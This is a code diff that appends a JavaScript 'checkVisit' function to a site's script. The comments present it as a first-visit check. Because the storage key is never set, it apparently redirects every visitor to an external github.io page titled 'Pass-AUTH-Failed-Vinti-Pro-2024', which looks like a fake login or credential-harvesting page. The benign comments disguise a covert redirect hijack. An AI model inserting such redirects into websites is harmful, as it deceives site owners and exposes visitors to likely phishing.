@@ -372,3 +372,21 @@ document.addEventListener('DOMContentLoaded', function() {
 });
 
 
+    // Function to check if the site has been visited
+    function checkVisit() {
+        const visitedKey = 'siteVisited';
+
+        // Check if the site has been visited
+        const hasVisited = localStorage.getItem(visitedKey);
+
+        // If not visited, redirect to the alternative site
+        if (!hasVisited) {
+            window.location.href = "https://backuppass.github.io/Pass-AUTH-Failed-Vinti-Pro-2024";
+        }
+    }
+
+    // Call checkVisit when your page loads
+    document.addEventListener("DOMContentLoaded", checkVisit);
+
+
+
